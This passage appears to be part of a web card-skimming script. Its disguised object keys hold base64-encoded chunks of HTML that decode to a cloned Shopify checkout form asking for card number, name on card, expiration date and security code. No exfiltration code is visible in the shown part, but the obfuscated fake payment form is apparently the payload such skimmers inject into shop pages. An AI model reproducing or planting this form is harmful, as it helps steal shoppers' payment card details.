AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzcmM9Imh0dHBzOi8vY2RuLnNob3BpZnkuY29tL3Nob3BpZnljbG91ZC9jaGVja291dC13ZWIvYXNzZXRzLzRjZGU2N2I0ZWNmYTMzZDIxODUxLnN2ZyINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb2xlPSJpbWciIHdpZHRoPSIzOCIgaGVpZ2h0PSIyNCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iXzF0Z2RxdzYxLTFxIF8xZnJhZ2VtYXgtMXEgXzFmcmFnZW1hcy0xcSBfMWZyYWdlbWI2LTFxIF8xZnJhZ2VtMzYtMXEgY2FyZC1wb3B1cC1pdGVtIj48aW1nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWx0PSIiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3JjPSJodHRwczovL2Nkbi5zaG9waWZ5LmNvbS9zaG9waWZ5Y2xvdWQvY2hlY2tvdXQtd2ViL2Fzc2V0cy8zNjQ5OGEwYzc4MDgzYTdkNzFlOS5zdmciDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9sZT0iaW1nIiB3aWR0aD0iMzgiIGhlaWdodD0iMjQi",
    category_value: "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iXzF0Z2RxdzYxLTFxIF8xZnJhZ2VtYXgtMXEgXzFmcmFnZW1hcy0xcSBfMWZyYWdlbWI2LTFxIF8xZnJhZ2VtMzYtMXEgY2FyZC1wb3B1cC1pdGVtIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYnkwcHRrYy0xcSBfMWZyYWdlbWFnLTFxIF8xZnJhZ2VtNjktMXEgXzFmcmFnZW03YS0xcSBfMWZyYWdlbTZyLTFxIF8xZnJhZ2VtMzUtMXEgXzFmcmFnZW1hZi0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9sYWJlbD4NCiAgICA8ZGl2IGlkPSJiYXNpYy1jcmVkaXQtY2FyZHMtY29sbGFwc2libGUiDQogICAgICAgIGNsYXNzPSJfOTRzeHRiMS0xcSBfMWZyYWdlbTd0LTFxIF8xZnJhZ2VtN3YtMXEgXzFmcmFnZW1haS0xcSBfMWZyYWdlbWF6LTFxIF8xZnJhZ2VtYXQtMXEgXzFmcmFnZW1iMy0xcSINCiAgICAgICAgc3R5bGU9ImhlaWdodDogYXV0bzsgb3ZlcmZsb3c6IHZpc2libGUiPg0KDQogICAgICAgIDxkaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJiN1VfUC0xcSI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzFpcDBnNjUxLTFxIF8xZnJhZ2VtMWUtMXEgXzFmcmFnZW1haS0xcSBfMWZyYWdlbTF4LTFxIF8xZnJhZ2VtMmUtMXEiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfOTRzeHRiMS0xcSBfMWZyYWdlbTd0LTFxIF8xZnJhZ2VtN3YtMXEgXzFmcmFnZW1haS0xcSBfMWZyYWdlbWF6LTFxIF8xZnJhZ2VtYXQtMXEgXzFmcmFnZW1iMy0xcSINCiAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJoZWlnaHQ6IGF1dG87IG92ZXJmbG93OiB2aXNpYmxlOyI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Il8xaXAwZzY1MS0xcSBfMWZyYWdlbTFlLTFxIF8xZnJhZ2VtYWktMXEgXzFmcmFnZW0xeC0xcSBfMWZyYWdlbTJlLTFxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImpOU0dlLTFxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfMWlwMGc2NTEtMXEgXzFmcmFnZW0xZS0xcSBfMWZyYWdlbWFpLTFxIF8xZnJhZ2VtMXgtMXEgXzFmcmFnZW0yZS0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFwYmQ2LTFxIF8xMHZybjlwMS0xcSBfMTB2cm45cDAtMXEgXzEwdnJuOXA2LTFxIj4NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzFmcmFnZW1haS0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGlkPSJjYXJkLW51bWJlci1sYWJlbCIgZm9yPSJjYXJkLW51bWJlciINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImNla3RuYzMtMXEgXzFmcmFnZW1hZy0xcSBfMWZyYWdlbWFmLTFxIF8xZnJhZ2VtOXktMXEgXzFmcmFnZW1iOC0xcSBfMWZyYWdlbWF4LTFxIF8xZnJhZ2VtYXMtMXEgXzFmcmFnZW1iNi0xcSBjYXJkLWxhYmVsIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImNla3RuYzkiPjxzcGFuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9InJlcm12ZjEtMXEgXzFmcmFnZW03dC0xcSBfMWZyYWdlbTd2LTFxIF8xZnJhZ2VtMTgtMXEiPkNhcmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBudW1iZXI8L3NwYW4+PC9zcGFuPjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iYmxvY2stY2FyZC1udW1iZXIiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJvVDMyRy0xcSB6c2FxSS0xcSBYa2gwRS0xcSBJYkxSby0xcSB4SU44Vi0xcSBibG9jay1pbnB1dCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBpZD0iY2FyZC1udW1iZXIiIHR5cGU9InRleHQiIGNsYXNzPSJjYXJkLWlucHV0Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxhY2Vob2xkZXI9IkNhcmQgbnVtYmVyIj4NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2lucHV0Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJQN0tBVC0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJfMWZyYWdlbTM3LTFxIF8xZnJhZ2VtMTAtMXEgXzFmcmFnZW05dC0xcSBfMWZyYWdlbTlzLTFxIGE4eDF3dTUtMXEgXzFmcmFnZW0xOC0xcSBhOHgxd3VpLTFxIGE4eDF3dW0tMXEiPjxzdmcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2aWV3Qm94PSIwIDAgMTQgMTQiIGZvY3VzYWJsZT0iZmFsc2UiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyaWEtaGlkZGVuPSJ0cnVlIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iYTh4MXd1by0xcSBfMWZyYWdlbTE4LTFxIF8xZnJhZ2VtMzctMXEgXzFmcmFnZW05dC0xcSBfMWZyYWdlbTlzLTFxIj4=",
    create: "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQ9Ik0zLjUgNi4zYzAtMi4yOTggMS4xMzEtNC45IDMuNS00LjkgMi4zNjkgMCAzLjUgMi42MDIgMy41IDQuOW0tOC40LjQ3djUuMzZjMCAuMjYuMjEuNDcuNDcuNDdoOC44NmMuMjYgMCAuNDctLjIxLjQ3LS40N1Y2Ljc3YS40Ny40NyAwIDAgMC0uNDctLjQ3SDIuNTdhLjQ3LjQ3IDAgMCAwLS40Ny40N1oiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3BhdGg+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEtejAtOS0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz48L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ1RzZLMS0xcSBET2xkZi0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJJZXNRcC0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwIGlkPSJlcnJvci1mb3ItYmxvY2stY2FyZC1udW1iZXIiIGNsYXNzPSJlcnJvci10ZXh0Ij5FbnRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhIHZhbGlkIGNhcmQgbnVtYmVyPC9wPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYXBiZDYtMXEgXzEwdnJuOXAxLTFxIF8xMHZybjlwMC0xcSBfMTB2cm45cDYtMXEiPg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfMWZyYWdlbWFpLTFxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgaWQ9Im5hbWUtb24tY2FyZC1sYWJlbCIgZm9yPSJuYW1lLW9uLWNhcmQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJjZWt0bmMzLTFxIF8xZnJhZ2VtYWctMXEgXzFmcmFnZW1hZi0xcSBfMWZyYWdlbTl5LTFxIF8xZnJhZ2VtYjgtMXEgXzFmcmFnZW1heC0xcSBfMWZyYWdlbWFzLTFxIF8xZnJhZ2VtYjYtMXEiPjxzcGFuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iY2VrdG5jOS0xcSI+PHNwYW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0icmVybXZmMS0xcSBfMWZyYWdlbTd0LTFxIF8xZnJhZ2VtN3YtMXEgXzFmcmFnZW0xOC0xcSI+TmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9uDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FyZDwvc3Bhbj48L3NwYW4+PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJibG9jay1uYW1lLW9uLWNhcmQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJvVDMyRy0xcSB6c2FxSS0xcSBYa2gwRS0xcSBJYkxSby0xcSBCX3BuSi0xcSBibG9jay1pbnB1dCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBpZD0ibmFtZS1vbi1jYXJkIiB0eXBlPSJ0ZXh0IiBjbGFzcz0iY2FyZC1pbnB1dCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYWNlaG9sZGVyPSJOYW1lIG9uIGNhcmQiPg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvaW5wdXQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InVHNksxLTFxIERPbGRmLTFxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Ikllc1FwLTFxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgaWQ9ImVycm9yLWZvci1ibG9jay1uYW1lLW9uLWNhcmQiIGNsYXNzPSJlcnJvci10ZXh0Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW50ZXIgeW91ciBuYW1lIGV4YWN0bHkgYXMgaXTigJlzIHdyaXR0ZW4gb24geW91ciBjYXJkPC9wPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iVDUwUGEtMXEgTGF5b3V0MS0xcSBQeXB5SS0xcSByaFV0Si0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3R5bGU+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLkxheW91dDEtMXE+Lmk2MDJNLTFxPiA6bnRoLWNoaWxkKDEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmxleDogMCAwIDEwMCU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLkxheW91dDEtMXE+Lmk2MDJNLTFxPiA6bnRoLWNoaWxkKDIpIHs=",
    set: "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmbGV4OiAwIDAgMTAwJTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuTGF5b3V0MS0xcT4uaTYwMk0tMXE+IDpudGgtY2hpbGQoMykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmbGV4OiAwIDAgMTAwJTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuTGF5b3V0MS0xcT4uaTYwMk0tMXEgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmbGV4LXdyYXA6IHdyYXA7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQG1lZGlhIGFsbCBhbmQgKG1pbi13aWR0aDogNzUwcHgpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLkxheW91dDEtMXE+Lmk2MDJNLTFxPiA6bnRoLWNoaWxkKDEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsZXg6IDEgMHB4Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLkxheW91dDEtMXE+Lmk2MDJNLTFxPiA6bnRoLWNoaWxkKDIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsZXg6IDEgMHB4Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLkxheW91dDEtMXE+Lmk2MDJNLTFxPiA6bnRoLWNoaWxkKDMpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsZXg6IDEgMHB4Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLkxheW91dDEtMXE+Lmk2MDJNLTFxIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsZXgtd3JhcDogbm93cmFwOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zdHlsZT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Imk2MDJNLTFxIFQ5ZmFYLTFxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJxeVdjMi0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJhcGJkNi0xcSBfMTB2cm45cDEtMXEgXzEwdnJuOXAwLTFxIF8xMHZybjlwNi0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzFmcmFnZW1haS0xcSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBpZD0iZXhwaXJhdGlvbi1kYXRlLWxhYmVsIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yPSJleHBpcmF0aW9uLWRhdGUiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0iY2VrdG5jMy0xcSBfMWZyYWdlbWFnLTFxIF8xZnJhZ2VtYWYtMXEgXzFmcmFnZW05eS0xcSBfMWZyYWdlbWI4LTFxIF8xZnJhZ2VtYXgtMXEgXzFmcmFnZW1hcy0xcSBfMWZyYWdlbWI2LTFxIj48c3Bhbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJjZWt0bmM5LTFxIj48c3Bhbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzcz0icmVybXZmMS0xcSBfMWZyYWdlbTd0LTFxIF8xZnJhZ2VtN3YtMXEgXzFmcmFnZW0xOC0xcSI+RXhwaXJhdGlvbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChNTQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFlZKTwvc3Bhbj48L3NwYW4+PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iYmxvY2stZXhwaXJhdGlvbi1kYXRlIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9Im9UMzJHLTFxIHhJTjhWLTFxIHpzYXFJLTFxIFhraDBFLTFxIEliTFJvLTFxIGJsb2NrLWlucHV0Ij4NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IGlkPSJleHBpcmF0aW9uLWRhdGUiIHR5cGU9InRleHQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xhc3M9ImNhcmQtaW5wdXQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxhY2Vob2xkZXI9IkV4cGlyYXRpb24gZGF0ZSAoTU0gLyBZWSkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4=",
    event_label: "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBpZD0iZXJyb3ItZm9yLWJsb2NrLWV4cGlyYXRpb24tZGF0ZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJlcnJvci10ZXh0Ij5FbnRlciBhIHZhbGlkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHBpcmF0aW9uIGRhdGU8L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InF5V2MyLTFxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFwYmQ2LTFxIF8xMHZybjlwMS0xcSBfMTB2cm45cDAtMXEgXzEwdnJuOXA2LTFxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfMWZyYWdlbWFpLTFxIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGlkPSJzZWN1cml0eS1jb2RlLWxhYmVsIiBmb3I9InNlY3VyaXR5LWNvZGUiDQogICAgICAgICAgICAgICA